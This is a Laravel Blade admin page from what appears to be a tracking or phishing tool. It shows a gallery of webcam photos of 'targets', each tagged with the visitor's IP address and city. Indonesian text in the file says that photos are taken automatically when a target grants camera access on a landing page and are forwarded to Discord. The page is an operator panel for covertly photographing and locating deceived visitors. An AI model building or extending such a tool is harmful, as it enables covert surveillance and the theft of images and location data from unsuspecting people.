@extends('layouts.admin')

@section('title', 'Webcam Captures')

@section('content')
<div class="space-y-6 max-w-7xl mx-auto">

    <!-- Header -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 p-4 sm:p-5 rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo">
        <div>
            <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded-md bg-pastel-lime border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
                    CAMERA FEED
                </span>
                <h1 class="text-xl sm:text-2xl font-black text-black tracking-tight">Captured Webcam Gallery</h1>
            </div>
            <p class="text-zinc-600 text-xs sm:text-sm mt-1 font-medium">Real-time target photos captured through browser camera telemetry stream.</p>
        </div>
        <div class="text-xs font-mono font-extrabold bg-pastel-purple border-2 border-black px-3 py-1.5 rounded-xl shadow-neo-sm text-black">
            Total Photos: {{ $snapshots->total() }}
        </div>
    </div>

    @if($snapshots->isEmpty())
        <div class="rounded-3xl bg-[#FFFDF9] border-[2.5px] border-black p-12 sm:p-16 text-center text-zinc-500 shadow-neo-lg">
            <span class="w-16 h-16 mx-auto mb-3 rounded-2xl bg-pastel-yellow border-2 border-black flex items-center justify-center text-black text-2xl shadow-neo">
                <i class="fa-solid fa-camera-retro"></i>
            </span>
            <h3 class="text-base sm:text-lg font-black text-black">Belum Ada Foto Tertangkap</h3>
            <p class="text-xs text-zinc-600 mt-1 max-w-sm mx-auto font-medium">Saat target mengizinkan akses kamera pada landing page, foto otomatis tersimpan di sini dan diteruskan ke Discord.</p>
        </div>
    @else
        <!-- Responsive Neo-Brutalist Grid -->
        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3 sm:gap-4">
            @foreach($snapshots as $snap)
                <div class="group bg-[#FFFDF9] border-2 border-black rounded-2xl overflow-hidden shadow-neo-sm hover:shadow-neo hover:-translate-y-1 transition duration-200 flex flex-col justify-between">
                    <div class="aspect-video bg-black relative overflow-hidden cursor-pointer" onclick="openPhotoPreview('{{ $snap->url }}', '{{ $snap->visitorLog->ip ?? 'Unknown IP' }}', '{{ $snap->created_at->format('M d, Y H:i:s') }}')">
                        <img src="{{ $snap->url }}" 
                             alt="Snapshot" 
                             loading="lazy"
                             class="w-full h-full object-cover group-hover:scale-105 transition duration-300">
                        <div class="absolute inset-0 bg-pastel-lime/40 opacity-0 group-hover:opacity-100 flex items-center justify-center text-black transition">
                            <span class="w-8 h-8 rounded-lg bg-white border border-black flex items-center justify-center shadow-neo-sm font-bold">
                                <i class="fa-solid fa-expand text-xs"></i>
                            </span>
                        </div>
                    </div>
                    <div class="p-2.5 text-[10px] sm:text-[11px] font-mono text-zinc-800 space-y-0.5 bg-cream-100 border-t-2 border-black">
                        <div class="text-black font-black truncate">
                            {{ $snap->visitorLog->ip ?? 'Unknown IP' }}
                        </div>
                        <div class="text-[9px] sm:text-[10px] text-zinc-600 font-bold truncate">
                            {{ $snap->visitorLog->city ?? 'Unknown' }}
                        </div>
                        <div class="text-[9px] sm:text-[10px] text-zinc-500 font-bold">
                            {{ $snap->created_at->format('M d, H:i') }}
                        </div>
                    </div>
                </div>
            @endforeach
        </div>

        @if($snapshots->hasPages())
            <div class="pt-4">
                {{ $snapshots->links() }}
            </div>
        @endif
    @endif

</div>

<!-- Photo Lightbox Modal (Neo-Brutalist) -->
<div id="photoModal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-xs hidden items-center justify-center p-3 sm:p-6" onclick="closePhotoPreview()">
    <div class="relative max-w-3xl w-full bg-[#FFFDF9] border-[3px] border-black rounded-3xl overflow-hidden shadow-neo-xl space-y-3 p-5" onclick="event.stopPropagation()">
        <div class="flex items-center justify-between border-b-2 border-black pb-3">
            <div>
                <h4 id="previewIp" class="text-sm font-black text-black font-mono">Target IP</h4>
                <p id="previewTime" class="text-[10px] text-zinc-600 font-mono font-bold">Time</p>
            </div>
            <button onclick="closePhotoPreview()" class="w-8 h-8 rounded-lg bg-pastel-orange border-2 border-black shadow-neo-sm text-black flex items-center justify-center font-bold active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition">
                <i class="fa-solid fa-xmark text-sm"></i>
            </button>
        </div>

        <div class="rounded-2xl overflow-hidden bg-black flex items-center justify-center max-h-[70vh] border-2 border-black shadow-neo-sm">
            <img id="previewImg" src="" alt="Full size preview" class="max-h-[65vh] w-auto object-contain">
        </div>

        <div class="flex justify-end pt-1">
            <a id="previewDownload" href="" target="_blank" class="px-4 py-2 bg-pastel-lime hover:bg-pastel-limeDark text-black rounded-xl text-xs font-black uppercase tracking-wider border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center gap-1.5">
                <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i> Open Original Photo
            </a>
        </div>
    </div>
</div>

@endsection

@section('scripts')
<script>
function openPhotoPreview(url, ip, time) {
    const modal = document.getElementById('photoModal');
    document.getElementById('previewImg').src = url;
    document.getElementById('previewIp').innerText = ip;
    document.getElementById('previewTime').innerText = time;
    document.getElementById('previewDownload').href = url;

    modal.classList.remove('hidden');
    modal.classList.add('flex');
}

function closePhotoPreview() {
    const modal = document.getElementById('photoModal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
}
</script>
@endsection
